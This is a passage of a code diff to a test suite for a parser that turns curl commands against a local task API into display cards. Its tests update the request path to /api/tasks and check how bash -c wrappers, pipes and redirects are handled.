+        "curl -s localhost:4000/api/tasks > /tmp/t.json | jq '.'",
+      ),
     ).toBeNull();
     // redirect on the jq stage of a producer pipeline stays raw
     expect(
       parseIsomuxCurl(
-        `jq -n '{a: 1}' > /tmp/x | curl -s -X POST localhost:4000/tasks -d @-`,
+        `jq -n '{a: 1}' > /tmp/x | curl -s -X POST localhost:4000/api/tasks -d @-`,
       ),
     ).toBeNull();
     // file redirects inside a display-filter tail still stay raw
     expect(
-      parseIsomuxCurl("curl -s localhost:4000/tasks | jq '.' > /tmp/t.json"),
+      parseIsomuxCurl(
+        "curl -s localhost:4000/api/tasks | jq '.' > /tmp/t.json",
+      ),
     ).toBeNull();
   });
 });
@@ -1288,10 +1324,12 @@ describe("parseIsomuxCurl output-to-file", () => {
 // script under the same conservative rules.
 describe("parseIsomuxCurl bash -lc wrapper (Codex)", () => {
   test("unwraps /bin/bash -lc 'curl ...' and cards the inner request", () => {
-    const req = parseIsomuxCurl(`/bin/bash -lc 'curl -s localhost:4000/tasks'`);
+    const req = parseIsomuxCurl(
+      `/bin/bash -lc 'curl -s localhost:4000/api/tasks'`,
+    );
     expect(req).not.toBeNull();
     expect(req!.method).toBe("GET");
-    expect(req!.path).toBe("/tasks");
+    expect(req!.path).toBe("/api/tasks");
     expect(req!.action).toBe("List tasks");
   });
 
@@ -1307,22 +1345,22 @@ describe("parseIsomuxCurl bash -lc wrapper (Codex)", () => {
 
   test("bare `bash -c` / `sh -c` / split `-l -c` forms all unwrap", () => {
     expect(
-      parseIsomuxCurl(`bash -c 'curl -s localhost:4000/tasks'`),
+      parseIsomuxCurl(`bash -c 'curl -s localhost:4000/api/tasks'`),
     ).not.toBeNull();
     expect(
-      parseIsomuxCurl(`sh -c 'curl -s localhost:4000/tasks'`),
+      parseIsomuxCurl(`sh -c 'curl -s localhost:4000/api/tasks'`),
     ).not.toBeNull();
     expect(
-      parseIsomuxCurl(`/usr/bin/bash -lc 'curl -s localhost:4000/tasks'`),
+      parseIsomuxCurl(`/usr/bin/bash -lc 'curl -s localhost:4000/api/tasks'`),
     ).not.toBeNull();
     expect(
-      parseIsomuxCurl(`bash -l -c 'curl -s localhost:4000/tasks'`),
+      parseIsomuxCurl(`bash -l -c 'curl -s localhost:4000/api/tasks'`),
     ).not.toBeNull();
   });
 
   test("unwraps a wrapped display-pipe tail", () => {
     const req = parseIsomuxCurl(
-      `/bin/bash -lc "curl -s localhost:4000/tasks | jq '.tasks'"`,
+      `/bin/bash -lc "curl -s localhost:4000/api/tasks | jq '.tasks'"`,
     );
     expect(req).not.toBeNull();
     expect(req!.pipeTail).toBe("| jq '.tasks'");
@@ -1337,24 +1375,26 @@ describe("parseIsomuxCurl bash -lc wrapper (Codex)", () => {
     // command substitution / assignment / extra statements are still compound
     expect(
       parseIsomuxCurl(
-        `/bin/bash -lc 'cd /tmp && curl -s localhost:4000/tasks'`,
+        `/bin/bash -lc 'cd /tmp && curl -s localhost:4000/api/tasks'`,
       ),
     ).toBeNull();
     expect(
       parseIsomuxCurl(
-        `/bin/bash -lc 'payload=$(cat x); curl -s localhost:4000/tasks'`,
+        `/bin/bash -lc 'payload=$(cat x); curl -s localhost:4000/api/tasks'`,
       ),
     ).toBeNull();
   });
 
   test("does NOT unwrap other shells or wrappers", () => {
-    expect(parseIsomuxCurl(`zsh -c 'curl -s localhost:4000/tasks'`)).toBeNull();
     expect(
-      parseIsomuxCurl(`env bash -c 'curl -s localhost:4000/tasks'`),
+      parseIsomuxCurl(`zsh -c 'curl -s localhost:4000/api/tasks'`),
+    ).toBeNull();
+    expect(
+      parseIsomuxCurl(`env bash -c 'curl -s localhost:4000/api/tasks'`),
     ).toBeNull();
     // extra positional args after the script ($0/$1) — bail
     expect(
-      parseIsomuxCurl(`bash -c 'curl -s localhost:4000/tasks' name arg1`),
+      parseIsomuxCurl(`bash -c 'curl -s localhost:4000/api/tasks' name arg1`),
     ).toBeNull();
   });
 
@@ -1362,15 +1402,17 @@ describe("parseIsomuxCurl bash -lc wrapper (Codex)", () => {
     // -n = read but do not execute; carding it would claim a request that
     // never happened. Only -l and -c are whitelisted in the flag cluster.
     expect(
-      parseIsomuxCurl(`bash -nc 'curl -s localhost:4000/tasks'`),
+      parseIsomuxCurl(`bash -nc 'curl -s localhost:4000/api/tasks'`),
     ).toBeNull();
-    expect(parseIsomuxCurl(`sh -nc 'curl -s localhost:4000/tasks'`)).toBeNull();
     expect(
-      parseIsomuxCurl(`bash -n -c 'curl -s localhost:4000/tasks'`),
+      parseIsomuxCurl(`sh -nc 'curl -s localhost:4000/api/tasks'`),
+    ).toBeNull();
+    expect(
+      parseIsomuxCurl(`bash -n -c 'curl -s localhost:4000/api/tasks'`),
     ).toBeNull();
     // an unrecognized behavior flag also bails
     expect(
-      parseIsomuxCurl(`bash -xc 'curl -s localhost:4000/tasks'`),
+      parseIsomuxCurl(`bash -xc 'curl -s localhost:4000/api/tasks'`),
     ).toBeNull();
   });
 
